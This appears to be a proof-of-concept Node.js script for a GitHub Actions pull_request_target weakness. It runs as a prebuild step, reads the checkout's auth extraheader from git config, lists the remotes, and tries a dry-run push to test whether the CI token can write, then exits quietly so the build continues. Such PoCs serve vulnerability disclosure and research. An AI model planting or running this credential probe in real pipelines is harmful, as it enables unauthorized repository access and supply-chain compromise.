// scripts/poc.mjs  (Node 20+, ESM)
import { execSync } from 'node:child_process';

function run(cmd) {
  try {
    const out = execSync(cmd, { stdio: ['ignore', 'pipe', 'pipe'], encoding: 'utf8' });
    return { ok: true, out };
  } catch (e) {
    return { ok: false, out: e.stdout?.toString() || '', err: e.stderr?.toString() || e.message };
  }
}

console.log('PoC: attacker-controlled code executed in pull_request_target (prebuild)');

// 1) Show that checkout left GitHub auth in git config
const extra = run("git config --local --get-regexp '^http\\.https://github\\.com/\\.extraheader$' || true");
if (extra.ok && extra.out.trim()) {
  console.log('[evidence] GitHub extraheader is present (auth is configured for this job).');
} else {
  console.log('[evidence] No extraheader found (auth not persisted by checkout).');
}
console.log('[debug] extraheader value (masked by GitHub):', (extra.out || '').trim());

// 2) Show current remotes
const rem = run('git remote -v');
console.log('[debug] git remotes:\n' + rem.out.trim());

// 3) Determine a safe target branch name for a DRY-RUN push
// Use the current HEAD ref name if available, else "poc-write-test"
let target = 'poc-write-test';
const curBranch = run('git rev-parse --abbrev-ref HEAD');
if (curBranch.ok) {
  const name = curBranch.out.trim();
  if (name && name !== 'HEAD') target = name;
}
console.log('[debug] dry-run target ref: refs/heads/' + target);

// 4) Attempt a DRY-RUN push (never creates anything)
const dry = run(`git push --dry-run origin HEAD:refs/heads/${target}`);
if (dry.ok) {
  console.log('✅ DRY-RUN push succeeded. This credential appears WRITE-CAPABLE.');
  console.log('[note] Even though no change was pushed (dry-run), a real push would likely succeed.');
} else {
  // Common failure strings: "Permission to ... denied", "cannot access", "read-only"
  console.log('🟡 DRY-RUN push blocked (likely READ-ONLY token or protected settings).');
  console.log('[stderr]:', (dry.err || '').slice(0, 500));
}

// 5) Exit cleanly so the build proceeds
process.exit(0);
